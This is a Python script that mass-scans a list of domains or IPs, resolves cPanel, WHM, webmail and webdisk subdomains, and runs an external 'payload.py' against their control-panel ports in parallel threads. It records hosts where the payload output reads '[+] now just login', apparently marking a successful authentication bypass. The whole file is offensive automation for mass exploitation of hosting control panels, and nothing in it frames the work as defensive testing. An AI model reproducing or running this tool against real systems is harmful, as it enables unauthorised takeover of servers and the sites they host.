import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import dns.resolver
import tldextract

parser = argparse.ArgumentParser()
parser.add_argument("--input", required=True, help="File containing target domains or IPs, e.g. domains.txt")
parser.add_argument("--output", default=None, help="Cve active output file (default: cve_active.txt)")
parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
args = parser.parse_args()

PROXY_TARGETS = {
    "cpanel": 2083,
    "whm": 2087,
    "webmail": 2096,
    "webdisk": 2078,
}

def get_domain(url):
    ext = tldextract.extract(url)
    return f"{ext.domain}.{ext.suffix}"

def resolve_subdomains(domain):
    subdomains = []
    common_subdomains = ["www", "cpanel", "whm", "webmail", "webdisk", "ftp", "blog"]

    domain = get_domain(domain)
    resolver = dns.resolver.Resolver()
    for sub in common_subdomains:
        try:
            full_domain = f"{sub}.{domain}"
            answers = resolver.resolve(full_domain, "A")
            for rdata in answers:
                subdomains.append(full_domain)
        except dns.resolver.NoAnswer:
            continue
        except dns.resolver.NXDOMAIN:
            continue
    return subdomains

def check_url(url):
    try:
        subdomains = resolve_subdomains(url)
        if not subdomains:
            subdomains.append(url) 
        for domain in subdomains:
            for service, port in PROXY_TARGETS.items():
                print(f"[*] Running payload.py against {domain}:{port}...")
                result = subprocess.run(
                    ["python", "payload.py", "--target", f"https://{domain}:{port}"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                html = result.stdout.decode("utf-8", errors="ignore")
                if "[+] now just login" in html:
                    with open(args.output or "cve_active.txt", "a") as output_file:
                        output_file.write(domain + "\n")
                    print(f"[+] {domain} is vulnerable")
                    break
                else:
                    print(f"[-] {domain} is not vulnerable")
        return f"Checked {url} successfully."

    except Exception as e:
        return f"[!] Error checking {url}: {e}"

with open(args.input) as f:
    get_urls = f.read().splitlines()

max_threads = args.threads
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = [executor.submit(check_url, url) for url in get_urls]
    for future in as_completed(futures):
        print(future.result())